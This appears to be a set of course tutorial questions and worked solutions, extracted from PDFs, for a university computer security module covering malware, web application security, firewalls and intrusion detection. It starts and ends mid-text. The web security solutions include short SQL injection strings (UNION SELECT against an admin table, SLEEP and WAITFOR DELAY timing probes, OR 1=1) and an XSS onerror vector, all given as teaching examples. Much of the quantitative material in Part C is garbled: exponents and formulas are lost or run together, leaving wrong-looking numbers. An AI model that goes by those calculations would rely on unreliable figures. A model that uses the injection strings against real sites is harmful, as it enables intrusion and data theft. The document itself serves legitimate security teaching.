Question: In DH-EKE, each side encrypts the other’s
public DH share with a symmetric cipher keyed by the
password. If encryption and decryption each take ~1ms,
and there are 2 exchanges, how many total milliseconds
are spent purely on encryption/decryption overhead
(ignoring exponentiations) per session?
5. SSO: Single Sign-On Attempt Time
Question: In an SSO environment, each authentication to
the SSO provider takes ~50ms. A user accessing 5
federated services in quick succession triggers 5 SSO
checks (one for each service). How many total
milliseconds does the user wait on average due to these
SSO calls (assuming no session caching)?
```

## Tutorial 5 Solution.pdf

[Tutorial 5 Solution.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 5 Solution.pdf)

```text
1
Tutorial 5 Solution
Malware Threats
Computer Security
BCS2420
Part A
1. Answer: A. It is theoretically proven that a perfect
malware detector cannot exist in all cases.
Explanation: The theoretical proof resembles the
undecidability problem in computability theory (akin to the
Halting Problem).
2. Answer: B. Worms spread autonomously through network
vulnerabilities, whereas viruses typically rely on users
executing infected files.
Explanation: This is the hallmark difference: worms do not
need user intervention to propagate.
3. Answer: C. A rootkit
Explanation: Rootkits hide themselves by intercepting
system calls, returning filtered results that exclude their
presence.
4. Answer: C. Malware that encrypts user data and demands
payment to restore access
Explanation: This is the essence of ransomware: holding the
data hostage.
5. Answer: A. The malware’s encrypted body changes with each
infection to evade signature detection.
Explanation: Polymorphic malware modifies its decryptor
and/or encryption layer frequently.
6. Answer: B. Exploiting browser or plugin vulnerabilities
without user awareness
Explanation: Drive-by downloads rely on silent exploits in
a user’s web session.
2
–
–
–
–
–
–
–
7. Answer: B. To stealthily manipulate API results, hiding the
rootkit’s presence or actions
Explanation: Hooking allows the rootkit to alter returned
data from OS functions.
8. Answer: C. A single centralized server is the only way to
manage botnets.
Explanation: This is false. Botnets can have peer-to-peer
or multi-layer command structures.
9. Answer: C. Capture user keystrokes to harvest passwords or
other sensitive data
Explanation: Keyloggers specifically record keystrokes.
10. Answer: B. Manipulating the kernel’s internal data
structures (DKOM) to hide processes or network connections
Explanation: Kernel-mode rootkits often use DKOM to avoid
detection by standard system utilities.
Part B
1. Malware Installation Pathways
Email Attachments: Example – The “ILOVEYOU” worm. Users
open a suspicious attachment, inadvertently executing
malware.
Drive-by Downloads: Malicious website injects exploits
into a user’s browser (e.g., exploit kits hosted on
compromised sites).
Trojanized Software: A legitimate installer repackaged
with hidden malware (e.g., infected game mods or “free
software” found on shady websites).
2. Virus vs. Worm Differences
Infection Mechanism: Viruses infect files or boot
sectors; worms propagate via network scanning and
exploiting vulnerabilities.
Propagation: Viruses rely on user actions (e.g.,
running an infected file); worms self-propagate
automatically.
User Involvement: Viruses typically need user
execution; worms do not.
Implications: Defenses must consider limiting user
access (to mitigate viruses) and network-based
3
–
–
–
–
–
–
–
–
–
patching/intrusion detection (for worms).
3. Rootkit Detection Challenges
Stealth Techniques:
1. System Call Hooking: Intercepts OS calls to hide
malicious processes and files.
2. Direct Kernel Object Modification (DKOM): Alters
kernel data structures to falsify system views.
Why Hard to Remove: Rootkits operate at low levels
(kernel space). Traditional antivirus at user level may
not see the tampered system calls, and removing them
might require a complete OS reinstall.
4. Polymorphic vs. Metamorphic Malware
Polymorphic: Maintains the same underlying malicious
code but encrypts the body with a variable decryptor.
Primary difference is the changed “wrapper,” but core
logic remains the same.
Metamorphic: Rewrites its own code (instructions,
structure) for each infection, potentially no static
signature.
Effect on Signature Detection: Both hamper static
signatures. Polymorphic changes the decryptor portion;
metamorphic can significantly alter code structure.
5. Ransomware Workflows
Steps:
1. Initial compromise (phishing or exploit).
2. Malware execution and stealthily scanning for
files.
3. Encryption of key files with a unique symmetric
key.
4. Encryption of the symmetric key with attacker’s
public key.
5. Ransom note demanding payment to decrypt.
Offline Backup Attacks: Modern strains often seek and
encrypt or corrupt backups to ensure no easy recovery
path.
6. Botnet Control Structures
Centralized: Strength – easy for botmaster to issue
commands; weakness – single point of failure if the C2
server is shut down.
Peer-to-Peer: Strength – more resilient, no single
takedown point; weakness – more complex to design,
4
–
–
–
–
–
–
–
–
–
possibly slower command propagation.
7. Drive-by Download Mechanisms
Browser Exploit: Attackers embed JavaScript or
malicious payloads that exploit a plugin or browser
vulnerability.
Redirection/Obfuscation: The user might be sent through
multiple redirect links or encoded scripts to hide the
final payload URL. Harder for defenders to block or
track.
8. Kernel-Mode vs. User-Mode Rootkits
Kernel-Mode: Full privileges, can manipulate system
calls at the OS core. Potentially more powerful and
stealthy.
User-Mode: Intercepts calls at the application level
(e.g., hooking IAT). Easier to develop but less control
than kernel-level.
Kernel-mode rootkits are more dangerous because they
operate where security software also runs, making
detection and removal difficult.
9. Trojan Horses and Backdoors
Embedding: Attackers modify legitimate software,
injecting malicious code that opens a hidden port or
user account.
Value: Provides persistent, secret access for
exfiltration or advanced attacks. Maintains stealth if
disguised as a legitimate process.
10. Vulnerability Exploits and Malware
Example Vulnerabilities:
1. Buffer Overflow: Allows arbitrary code execution at
the privilege level of the vulnerable program.
2. SQL Injection: Attackers can insert commands to
manipulate backend databases or retrieve sensitive
info.
Importance of Patching: Quick patching prevents malware
from exploiting known flaws, limiting widespread
infection.
5
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
Part C
1. Worm Spread Rate
Rate:  probes/hour.
Vulnerable fraction: 0.01% = 0.0001.
New infections/hour = .
If the infected population doubles every hour, after 5
hours:
Initial = 100 (hour 1).
Hour 2 = 200, Hour 3 = 400, Hour 4 = 800, Hour 5 =
1600.
Or if we strictly track from “start,” we might say
100 → 200 → 400 → 800 → 1600, so about 1,600
infected after 5 cycles.
2. Ransomware File-Encryption Scale
RSA encryption step: 20ms per encryption of the AES
key.
5000 systems → .
 minutes to encrypt all those AES keys across
5000 victims.
3. Botnet Attack Throughput
50,000 zombies, each can send 10,000 spam emails/hour.
Per day: 24 hours →
Hourly total = 
emails/hour.
Daily total =  emails 12
billion emails/day.
4. Polymorphic Malware Signature Coverage
Malware generates 100 new decryptor shapes per day.
Antivirus can issue 1 signature update daily.
In 7 days, malware = (100 \times 7 = 700) forms.
Antivirus = 7 new signatures.
Even if each signature covers 1 variant, (700 - 7 =
693) forms remain uncovered. The gap grows, outpacing
daily signature updates.
106
10×60.0001=100
5000×20ms=100,000ms=100 seconds
≈1.67
50,000×10,000=5×108
5×10×824=1.2×1010
```

## Tutorial 5.pdf

[Tutorial 5.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 5.pdf)

```text
1
Tutorial 5
Malware Threats
Computer Security
BCS2420
Part A
1. Which statement about the undecidability of detecting
malware is correct?
It is theoretically proven that a perfect malware
detector cannot exist in all cases.
Malware detection is easily automated with zero false
positives.
Any code that modifies system files is necessarily
malware.
Commercial antivirus tools already achieve perfect
detection.
2. Which feature distinguishes a worm from a virus?
Worms require user intervention (e.g., opening an
attachment), while viruses do not.
Worms spread autonomously through network
vulnerabilities, whereas viruses typically rely on
users executing infected files.
Worms cannot replicate, but viruses replicate
aggressively.
Worms are always detected by signature-based
antivirus, while viruses often go undetected.
3. A piece of malware that intercepts system calls to hide its
processes from user utilities is typically classified as:
A logic bomb
A worm
A rootkit
Ransomware
2
4. Which best describes a ransomware attack?
Malware that primarily spreads via self-replicating
network exploits
A Trojan horse that silently steals keystrokes for
indefinite periods
Malware that encrypts user data and demands payment
to restore access
A rootkit that replaces the kernel’s system-call
table
5. When malware uses polymorphic techniques, it means that:
The malware’s encrypted body changes with each
infection to evade signature detection.
The malware cannot be disinfected without
reformatting the system.
It specifically targets multiple operating systems
equally.
The malware does not replicate but changes user
privileges frequently.
6. Which factor is most associated with a drive-by download
attack?
Relying on user curiosity to click an email
attachment
Exploiting browser or plugin vulnerabilities without
user awareness
Attaching malicious macros to Microsoft Office
documents
Replacing user-mode libraries after the OS boots
7. What is the main purpose of hooking or replacing system
calls in a rootkit?
To detect other malicious software by scanning the
kernel
To stealthily manipulate API results, hiding the
rootkit’s presence or actions
To accelerate cryptographic operations
To forcibly reinstall the operating system in a loop
8. Which of the following statements about botnets is false?
Botnets typically consist of compromised machines
under remote command-and-control.
Botnets may communicate using peer-to-peer or multi-
tiered architectures.
A single centralized server is the only way to manage
3
–
–
–
–
botnets.
Botnets can be used for DDoS attacks, spam campaigns,
or credential theft.
9. A keylogger is primarily designed to:
Render the OS unbootable until a ransom is paid
Replace standard binaries (like ls or ps) to hide
malicious processes
Capture user keystrokes to harvest passwords or other
sensitive data
Create duplicates of infected files to spread to
other machines
10. Which technique might a kernel-mode rootkit use to remain
undetected?
Including a special self-destruct button in the user
interface
Manipulating the kernel’s internal data structures
(DKOM) to hide processes or network connections
Encouraging the user to run system updates frequently
Conducting a phone-based phishing campaign
Part B
1. Malware Installation Pathways
Question: Summarize three different malware delivery
methods (e.g., email attachments, drive-by downloads)
and describe one real-world example for each method.
2. Virus vs. Worm Differences
Question: Compare and contrast viruses and worms in
terms of infection mechanism, propagation, and user
involvement. What implications do these differences
have for designing effective defensive measures?
3. Rootkit Detection Challenges
Question: Why are rootkits considered especially
difficult to detect and remove? Discuss two stealth
techniques rootkits commonly use and how these pose
challenges to traditional antivirus.
4. Polymorphic and Metamorphic Malware
Question: Explain the difference between polymorphic
4
–
–
–
–
–
–
and metamorphic malware. Illustrate how each makes
signature-based detection difficult.
5. Ransomware Workflows
Question: Outline the key steps in a modern ransomware
attack, from initial compromise to payment demand. How
do advanced ransomware strains ensure that even offline
backups might be compromised?
6. Botnet Control Structures
Question: Describe two different C2 (command-and-
control) architectures for botnets (e.g., centralized
vs. peer-to-peer). For each architecture, note a
strength and a weakness from the botmaster’s
perspective.
7. Drive-by Download Mechanisms
Question: Analyze a typical drive-by download scenario.
How do attackers exploit browser vulnerabilities, and
what redirection or obfuscation techniques might they
use?
8. Kernel-Mode vs. User-Mode Rootkits
Question: Distinguish between kernel-mode and user-mode
rootkits in terms of system privileges, potential
stealth, and risk. Why might a kernel-mode rootkit be
more powerful?
9. Trojan Horses and Backdoors
Question: Many Trojan horses include hidden backdoors.
Discuss how attackers typically embed these backdoors
and why they are valuable for long-term system
compromise.
10. Vulnerability Exploits and Malware
Question: Malware often relies on software
vulnerabilities to gain elevated privileges or execute
arbitrary code. Describe two example vulnerabilities
(e.g., buffer overflow, SQL injection) commonly
targeted by malware, and why patching them quickly is
crucial.
5
–
–
–
–
Part C
1. Worm Spread Rate
Question: Suppose a worm scans the internet for
vulnerable hosts at a rate of (10) probes per hour. If
roughly 0.01% of all hosts probed are unpatched and
become newly infected, estimate how many new infections
occur per hour. If the infected population doubles each
hour, how many infections might there be after 5 hours?
2. Ransomware File-Encryption Scale
Question: A ransomware variant encrypts user files
using a hybrid approach. It generates a 256-bit AES key
per system to encrypt all files, then encrypts that AES
key using a 2048-bit RSA public key. If the RSA
encryption step takes 20ms on average, how long would
it take to encrypt the AES key across 5000 infected
systems?
3. Botnet Attack Throughput
Question: A botnet with 50,000 active zombies can each
send 10,000 spam emails per hour. What is the total
spam-sending capacity per day (24 hours)? Express your
answer in billions of emails per day.
4. Polymorphic Malware Signature Coverage
Question: A polymorphic malware variant can create 100
distinct decryptor shapes per day. An antivirus vendor
can only generate 1 new signature update per day.
Explain quantitatively how the malware’s mutation rate
might outpace signature-based detection (e.g., how many
forms remain undetected over a week).
6
```

## Tutorial L6 Solution..pdf

[Tutorial L6 Solution..pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial L6 Solution..pdf)

```text
1
Tutorial 6 Solution
Securing Web Applications
Computer Security
BCS2420
Part A: Multiple Choice – Ideal Answers
1. Answer: D. SOP does not apply if two pages share the same
top-level domain (TLD, e.g., .com).
Explanation: SOP checks scheme, host, port, not just TLD.
So evil.com vs bank.com are different origins even though
they share .com.
2. Answer: B. The browser automatically fetches malicious
scripts from a compromised website, exploiting
vulnerabilities without explicit user action.
3. Answer: C. They protect cookies from direct access by
client-side scripts, mitigating some XSS-based theft
attempts.
4. Answer: B. CSRF exploits the fact that browsers
automatically attach cookies to outgoing requests for a
domain.
5. Answer: B. Stripping or sanitizing potentially dangerous
HTML and script tags from user-generated content.
6. Answer: C. A malicious link contains script code that the
target server includes in its error message, immediately
returning it to the user’s browser.
7. Answer: C. To verify that an HTTP request originated from
the legitimate site’s page/form rather than a third-party
injection.
8. Answer: B. Using parameterized (prepared) statements that
keep SQL logic separate from user input.
9. Answer: B. Ensure a cookie is only sent over HTTPS
connections.
2
–
–
–
–
–
–
–
–
–
10. Answer: B. Sanitizing or encoding any untrusted data before
adding it into the DOM or URL fragments.
Part B
1. HTTP Cookies and Authentication
Why critical? Cookies provide continuity across
stateless HTTP by storing session identifiers or login
states.
Attacks:
1. Cookie theft via XSS or malicious script reading
document.cookie.
2. Network sniffing if no HTTPS is used.
3. Session fixation or replay if cookies aren’t
invalidated or bound to session constraints.
Defenses:
1. TLS (HTTPS) to prevent interception.
2. Cookie binding with IP or user agent checks, or
cryptographic signing of cookie content.
3. Short session lifetimes plus re-auth on critical
actions.
2. Mixed Content and HTTPS
Mixed content is dangerous because an attacker
controlling or hijacking the HTTP elements can inject
malicious scripts or modify content.
If the attacker intercepts an HTTP script, they can
rewrite it to perform malicious actions, effectively
defeating the security of the main HTTPS page.
This breaks the authenticity and integrity guarantees
of HTTPS.
3. CSRF vs. XSS
CSRF: Exploits automatic cookie sending to cause
unintended actions on a site where the user is already
authenticated.
XSS: Involves injecting scripts into a trusted site’s
pages so they run in a victim’s browser.
A site can be vulnerable to both: XSS can steal user
cookies or embed hidden forms (CSRF).
3
–
–
–
–
–
–
–
–
–
–
–
–
–
Mitigations:
CSRF: Use secret tokens, SameSite cookies, user re-
auth.
XSS: Input/output sanitization, Content Security
Policy, HttpOnly cookies.
4. Subdomain Scoping of Cookies
Domain attribute = .example.com → the cookie is
accessible to all subdomains under example.com.
Path attribute further restricts which URL paths can
see the cookie.
Vulnerability: If you set .example.com but there’s an
untrusted subdomain (untrusted.example.com), that
subdomain can read the cookie, leading to a compromise
of user sessions.
5. SQL Injection Attack Patterns
Advanced Patterns:
1. UNION-based injection: UNION SELECT password,1,1 
FROM admin_table appended to the query.
2. Time-based blind injection: Use SLEEP(5) or WAITFOR 
DELAY '0:0:5' to test values.
Naive sanitization might fail because attackers can
nest or obfuscate queries (hex-encode, comments, etc.).
6. Prepared Statements vs. Escaping
Prepared statements separate the SQL logic from the
user input. The DB engine handles placeholders safely.
Example (pseudo-code):
stmt = connection.prepare("SELECT * FROM users WHERE 
username=? AND password=?")
stmt.bind(usernameInput)
stmt.bind(passwordInput)
result = stmt.execute()
This approach ensures user input can’t break the query
structure.
7. CSP (Content Security Policy)
CSP can specify default-src 'self' to restrict
resources to the same origin.
script-src 'self' 'nonce-xyz' can limit scripts to
those with a particular nonce or from a trusted domain.
This drastically reduces or blocks inline scripts or
external resources from unknown domains, mitigating
many XSS attacks.
4
–
–
–
–
–
–
–
–
–
–
–
–
–
–
8. Impact of XSS on SOP
If an attacker injects malicious JavaScript into the
legitimate domain, that code runs with that domain’s
origin privileges.
They can read or modify any data accessible under that
origin: cookies, local storage, or even the site’s
private user data.
Essentially, it’s as if the site’s own script performed
those actions, bypassing the SOP.
9. Browser Security vs. Server Security
Client-side: SOP, XSS filters, sandboxing, same-site
cookies, etc.
Server-side: Input validation, encryption, session
management.
Relying on only one side is insufficient because
malicious actors can bypass client checks or exploit
server misconfigurations. Multiple layers (defense in
depth) ensure if one layer fails, others still protect
the system.
10. Designing a Secure File-Upload
Measures:
Validate file type and MIME type (e.g., only allow
image/jpeg).
Rename the file on the server (avoid user-supplied
filenames).
Store files outside the webroot or serve them via a
separate domain to prevent direct script execution.
Perform virus scans or sanitize images (strip EXIF or
metadata).
Set correct Content-Type headers on download to avoid
forced execution as HTML.
Part C
1. Estimating Cookie Expiration Risks
(a) Probability of success in 4 hours:
Attacker success rate ~ (1/2{,}000{,}000) per hour.
Over 4 hours, an approximate bounding approach:
4
5
–
–
–
–
–
–
 with .
(this is a rough estimate, still around 1 in 500,000).
(b) With Max-Age = 1 hour, the probability is roughly:
Reducing session length cuts success probability
proportionally in this scenario.
2. SQL Injection and Database Size
(a) Worst case: enumerating 1,000,000 rows × each row’s
username of max length 10, from 95 characters. For each
character, attacker does a 1-second test (timing-
based): 
Actually, a naive approach might do a binary search per
character . Then total checks:
(This is a simplified estimate. If they do single attempts
per possible char, it might be even more.)
(b) Reduction: Use faster out-of-band channels, exploit
advanced queries (dump many rows at once), or find a
direct injection that enumerates entire tables with
fewer queries (e.g., union-based injection or more
efficient conditional checks).
3. XSS Injection Surface
(a) Each payload ~100 chars; total limit = 2,000 chars.
(b) Even if < and > are escaped, attackers might use
other encodings (e.g., &#x3C; for <) or manipulate
attributes (e.g., onerror in <img src=... 
onerror=...>). They could also exploit unescaped quotes
or use JavaScript protocol URIs if not filtered.
4. Reflected XSS via URL Parameters
Each request test: ~500ms to see result. In 1 minute =
60 seconds →
if done sequentially.
P(success in 4 hrs)≈1−(1−p)4 p=1/2,000,000
1−(1−0.5×10)−64
≈1−(1−0.5×10)−64
≈1−(0.9999995)4
≈2×10−6
1−(1−0.5×10)≈−61 0.5×10.−6
1,000,000 rows×10 chars/row×
log(95) tests?2
log2(95) 6.57
1,000,000×10×7×1 s≈70,000,000 s
≈2.22 years.
=100
200020 possible attempts embedded.
=0.5 s/request
60 s 120 attempts
6
```

## Tutorial L6.pdf

[Tutorial L6.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial L6.pdf)

```text
1
Tutorial 6
Securing Web Applications
Computer Security
BCS2420
Part A
1. Which statement about the Same-Origin Policy (SOP) is
incorrect?
SOP compares the scheme, host, and port to decide if
two resources share the same origin.
SOP forbids a script from https://bank.com to
directly access any data from https://bank.com:8443.
SOP can sometimes be relaxed by changing the
document.domain property to a shared parent domain.
SOP does not apply if two pages share the same top-
level domain (TLD, e.g., .com).
2. Which of the following best describes a drive-by download
attack?
An attacker sends a phishing email with a malicious
attachment that requires user execution.
The browser automatically fetches malicious scripts
from a compromised website, exploiting
vulnerabilities without explicit user action.
A user intentionally installs a Trojan horse from a
third-party software repository.
The attacker physically installs malicious firmware
on the victim’s device.
3. Why are HttpOnly cookies often used to store session
identifiers?
They reduce the size of HTTP requests by removing the
domain field.
They ensure that the cookie is only accessible via
2
client-side JavaScript.
They protect cookies from direct access by client-
side scripts, mitigating some XSS-based theft
attempts.
They automatically encrypt the cookie’s contents in
transit.
4. Which of the following statements about Cross-Site Request
Forgery (CSRF) is true?
CSRF relies on malicious code injected into the
victim’s browser via script tags.
CSRF exploits the fact that browsers automatically
attach cookies to outgoing requests for a domain.
CSRF is prevented by using a strictly long URL for
requests.
CSRF cannot affect sites protected by HTTPS.
5. Which defense is best suited for preventing stored XSS
attacks?
Using an HTTPS connection for all pages
Stripping or sanitizing potentially dangerous HTML
and script tags from user-generated content
Requiring a secret validation token in POST requests
Disallowing cookies completely
6. Which scenario exemplifies Reﬂected XSS?
An attacker stores a malicious script in a site’s
comment section, and all visitors see the injected
script.
An attacker uses a hidden IFRAME to submit a form to
another origin.
A malicious link contains script code that the target
server includes in its error message, immediately
returning it to the user’s browser.
A malicious script modifies the browser’s DOM on a
single-page application without server involvement.
7. What is the main purpose of CSRF tokens?
To encrypt all request parameters in transit
To allow the attacker to reuse the user’s session on
a different machine
To verify that an HTTP request originated from the
legitimate site’s page/form rather than a third-party
injection
To log out the user if suspicious behavior is
3
–
–
detected
8. Which SQL injection prevention method is recommended in
modern web frameworks?
Escaping all user input with backslashes before
concatenation
Using parameterized (prepared) statements that keep
SQL logic separate from user input
Disabling all forms that accept user input
Converting user input to uppercase before adding it
to the query
9. The “Secure” cookie attribute is meant to:
Restrict a cookie’s usage to only the same origin
domain
Ensure a cookie is only sent over HTTPS connections
Make the cookie accessible by client-side JavaScript
Invalidate the cookie if the user’s IP address
changes
10. Which approach helps mitigate DOM-based XSS
vulnerabilities?
Changing the default port to 8080 for web traffic
Sanitizing or encoding any untrusted data before
adding it into the DOM or URL fragments
Disabling all cross-domain iframes
Using a multi-factor authentication token in each GET
request
Part B
1. HTTP Cookies and Authentication
Question: In web-based authentication, why are cookies
so critical to maintaining sessions? Explain how
malicious attackers might steal or abuse these cookies,
and propose two different defensive measures (beyond
HttpOnly) to protect them.
2. Mixed Content and HTTPS
Question: A website loads its main page over HTTPS but
includes some scripts and images over HTTP. Discuss why
this is dangerous. In your answer, explain how an
4
–
–
–
–
–
–
–
active network attacker could exploit this setup to
compromise the site’s security.
3. CSRF vs. XSS
Question: Compare and contrast Cross-Site Request
Forgery (CSRF) with Cross-Site Scripting (XSS). How can
an application be vulnerable to both simultaneously,
and how do the mitigation strategies differ?
4. Subdomain Scoping of Cookies
Question: How do the Domain and Path attributes of an
HTTP cookie affect which subdomains (and URLs) can read
the cookie? Provide an example scenario where
misconfigured domain scoping leads to a security
vulnerability.
5. SQL Injection Attack Patterns
Question: What are two advanced SQL injection patterns
(beyond the simple ' OR 1=1 --)? For each pattern,
briefly explain the exploitation idea and why naive
sanitization might fail against it.
6. Prepared Statements vs. Escaping
Question: In the context of mitigating SQL injection,
why do prepared statements (parameterized queries)
often outperform manual escaping or blacklist-based
sanitization? Provide a short example in pseudo-code
that illustrates how prepared statements prevent
injection.
7. CSP (Content Security Policy)
Question: Outline how a Content Security Policy can
help mitigate XSS attacks. Mention at least two
specific directives (e.g., default-src, script-src)
and how they reduce the attack surface.
8. Impact of XSS on SOP
Question: If an attacker successfully injects
JavaScript into a legitimate domain (via stored XSS),
how might this effectively bypass the browser’s same-
origin policy? Detail the potential consequences for
user data stored or accessible under that domain.
9. Browser Security vs. Server Security
Question: Discuss the interplay between client-side
(browser-based) security mechanisms (e.g., same-origin
policy, XSS filters) and server-side measures (e.g.,
input validation, authentication checks). Why is a
5
–
–
–
–
–
–
–
–
“defense in depth” approach necessary?
10. Designing a Secure File-Upload
Question: A web application allows users to upload
images. What steps should the server take to ensure
malicious scripts or executables cannot be uploaded or
executed? Provide at least three distinct measures.
Part C
1. Estimating Cookie Expiration Risks
Question: A session cookie has a Max-Age of 4 hours.
Assume an attacker can guess or brute-force a random
session token with a probability of success 1 in 2
million per hour.
(a) What is the approximate probability the
attacker succeeds within 4 hours if attacks are
continuous?
(b) If the server decides to reduce Max-Age to 1
hour, what does the success probability become?
2. SQL Injection and Database Size
Question: An attacker performs a blind SQL injection on
a user table containing ~1,000,000 rows. Each guess to
confirm a single row’s column value takes ~1 second via
a timing-based technique.
(a) If the attacker tries to enumerate an entire
column (e.g., username) with a maximum length of 10
ASCII characters, how many total seconds might be
required in the worst case (assuming 95 printable
characters)?
(b) Propose one method to reduce this enumeration
time for the attacker.
3. XSS Injection Surface - Question: A forum restricts posts
to 2,000 characters. An attacker attempts to insert
malicious JavaScript using inline event handlers or
<script> tags.
(a) Suppose each inserted payload is ~100 characters.
How many potential injection attempts can they embed in
a single post if the forum does not sanitize it?
6
–
–
–
–
–
(b) If the forum actively escapes all angle brackets <
and >, how might an attacker still attempt XSS?
4. Reflected XSS via URL Parameters
Question: A website echoes user input from a URL
parameter into its error message (reflected XSS). If
each request takes ~500ms to confirm whether the
injection succeeded, how many attempts can an attacker
perform in 1 minute of testing on a single URL?
5. Cookie Domain Scope
Question: A site sets the Domain attribute of its
cookie to .example.com. The organization has subdomains
a.example.com and b.example.com.
(a) Which subdomains can read the cookie?
(b) If there are 10 subdomains, what are the
security implications if one subdomain is
compromised?
```

## Tutorial L7.pdf

[Tutorial L7.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial L7.pdf)

```text
1
Tutorial 7
Network Defense: Firewalls and Tunnels
Computer Security
BCS2420
Part A
1. A company has a strict firewall configuration that drops
all incoming connections except on port 80 (HTTP). Which
statement about this policy is correct?
It completely prevents attackers from sending
malicious content over HTTP.
It enforces a default-deny stance, reducing the
attack surface except for allowed ports.
It is useless if the network has internal malicious
insiders.
It automatically protects against tunneling
protocols.
2. Which scenario best demonstrates the advantage of using
stateful firewalls over stateless ones?
Dropping malformed packets based solely on IP header
checks.
Allowing inbound HTTP responses only if they
correspond to an established outbound HTTP session.
Logging all ICMP packets from external networks.
Rejecting all incoming traffic from private IP
addresses.
3. A DMZ segment in a firewall architecture is primarily used
to:
Provide a trusted internal subnet that only employees
can access.
Host public-facing services (e.g., web servers) with
restricted connectivity to the internal network.
2
Encrypt all traffic crossing the perimeter.
Replace the need for a dedicated bastion host.
4. Which of the following is not a typical limitation or
weakness of traditional firewalls?
They assume a clearly defined network perimeter that
might not exist in modern environments.
They cannot inspect or block encrypted content
(unless configured with special mechanisms).
They automatically detect malicious insiders and
block their traffic.
They can be bypassed by protocols tunneled over
allowed ports.
5. Which statement about proxy firewalls is true?
They only operate at the network layer (layer 3) and
cannot inspect application data.
They relay traffic at the application or circuit
level, potentially examining content for malicious
patterns.
They are always slower than packet filters because
they drop all packets.
They do not require any specialized software—just
normal router firmware.
6. How does SSH port forwarding (local forwarding) increase
security for an application protocol that normally sends
data in the clear?
It compresses the data to reduce bandwidth.
It encapsulates the application’s plaintext traffic
within an encrypted SSH session, preventing
eavesdropping.
It blocks all inbound connections to the server.
It automatically replaces user authentication with a
certificate.
7. A firewall with a default-allow policy means:
All traffic is blocked unless specifically permitted
by a rule.
All traffic is allowed unless specifically denied by
a rule.
The firewall denies all traffic to or from port 80
and 443.
The firewall logs inbound traffic but does not
enforce rules.
3
–
8. What is the key characteristic of tunnel mode VPN in IPsec?
It encrypts only the TCP header, leaving IP addresses
unencrypted.
It encapsulates the entire IP packet (including
headers) within a new IP header, providing site-to-
site encryption.
It never authenticates packet sources, only
encryption.
It is used solely for host-to-host encryption, not
site-to-site.
9. Why is port knocking sometimes used in conjunction with
firewalls?
To open inbound ports only after a secret sequence of
connection attempts (knocks) is made, enhancing
stealth and reducing exposed services.
To forcibly close all ephemeral ports once a user
logs out.
To automatically switch the firewall from default-
deny to default-allow.
To enable dynamic NAT for inbound connections.
10. Traditional FTP uses separate control and data channels. A
stateful firewall that supports FTP typically:
Rejects all inbound data connections since they are
never recognized.
Dynamically opens the required data port upon seeing
the PORT/PASV command on the control channel.
Depends on default-allow policy for inbound ports.
Cannot handle passive FTP at all.
Part B
1. Choke-Point Security
Question: In a modern enterprise with distributed,
cloud-based services, how does the traditional concept
of a network choke point (single firewall perimeter)
become less effective? Propose two ways organizations
adapt firewall usage to handle this shift.
2. Default-Deny vs. Default-Allow
4
–
–
–
–
–
–
–
–
Question: Compare the default-deny and default-allow
approaches in firewall rulesets. Discuss one advantage
and one disadvantage of each approach, and clarify
which is typically more secure by default.
3. Stateful vs. Stateless Firewall
Question: Outline the functional difference between a
stateless packet filter and a stateful inspection
firewall. Give a real-world example (beyond the
standard TCP handshake check) where stateful behavior
clearly outperforms stateless filtering.
4. VPN Modes
Question: Explain the difference between transport mode
and tunnel mode in IPsec-based VPNs. In which scenario
might transport mode be preferable, and why?
5. SSH Security
Question: Traditional telnet is insecure because data
flows in plaintext. Demonstrate how SSH addresses
confidentiality and integrity for remote shell
connections. Also, describe how server authentication
works in SSH to prevent MITM.
6. Proxy-based Firewalls
Question: Compare circuit-level and application-level
proxy firewalls. Which type can filter at the level of
HTTP or FTP commands, and which is more limited in
protocol understanding? Also mention how proxies can
hamper performance.
7. DMZ Architecture
Question: Illustrate a DMZ architecture with at least
two screening routers and a bastion host. Show how
external users reach the DMZ but have limited access to
the internal network. Why is this design favored for
public-facing servers?
8. Firewall Limitations
Question: Summarize two fundamental firewall
limitations that cannot be solved by more advanced
filtering rules. For each limitation, suggest a
complementary security measure to mitigate it.
9. SSH Port Forwarding
Question: Provide a scenario where local SSH port
forwarding solves a security or connectivity problem.
Describe how data from an insecure protocol is
5
–
encapsulated and how the user sets up such a tunnel.
10. Layered Defense
Question: Why do organizations often deploy multiple
firewall layers (e.g., perimeter firewall + host-based
firewall)? Discuss how a host-based firewall on a
server can complement the perimeter firewall’s policy,
including an example of an insider threat scenario.
```

## Tutorial L8.pdf

[Tutorial L8.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial L8.pdf)

```text
1
Tutorial 8
Detecting and Preventing Intrusions
Computer Security
BCS2420
Part A
1. Which statement correctly describes the difference between
an Intrusion Detection System (IDS) and an Intrusion
Prevention System (IPS)?
An IDS can block malicious packets in real time,
while an IPS can only alert.
An IDS passively monitors and alerts on suspicious
activity, while an IPS can also actively block or
modify traffic.
Both IDS and IPS require real-time packet dropping.
An IPS always uses anomaly-based detection, whereas
an IDS is purely signature-based.
2. An anomaly-based IDS has a 1% false positive rate and
detects 90% of attacks. If the actual rate of attacks is
extremely low, which outcome is most likely in practice?
The IDS rarely triggers alarms at all.
Most alarms raised will be false alarms.
Nearly all alarms will be true positives.
The base rate does not affect the proportion of false
alarms.
3. What is a fundamental limitation of signature-based
intrusion detection?
It cannot process more than 1 Gbps of traffic.
It can only detect known attack patterns and must be
frequently updated.
It has zero false positives but high false negatives.
It exclusively relies on user-provided rule sets to
2
define normal behavior.
4. A specification-based approach to intrusion detection:
Learns normal behavior from a training dataset
automatically.
Raises alarms when events match known malicious
signatures.
Checks events against explicitly defined rules for
allowed behavior, flagging anything outside that
specification.
Relies primarily on packet header inspection rather
than content.
5. Which factor contributes most to high false positives in
anomaly-based IDS?
Deficient hardware resources
Intruder-free training data
Profiles that may not accurately capture the full
range of normal behavior
Excessive reliance on known attack patterns
6. A host-based intrusion detection system (HIDS) typically
monitors:
Network traffic at the perimeter router only
OS logs, file integrity, and processes on a single
host
ARP broadcasts on a local network
Physical security cameras inside a data center
7. In the context of IDS terminology, a false negative is:
When the system incorrectly flags benign activity as
malicious
When the system fails to detect a real intrusion
When the alarm precision is below 50%
When an anomaly-based system incorrectly classifies
new attacks as normal
8. Network-based IDS often uses packet sniffer components. Why
might sniffing be harder on a switched LAN compared to a
hub-based LAN?
Switches do not forward all traffic to every port,
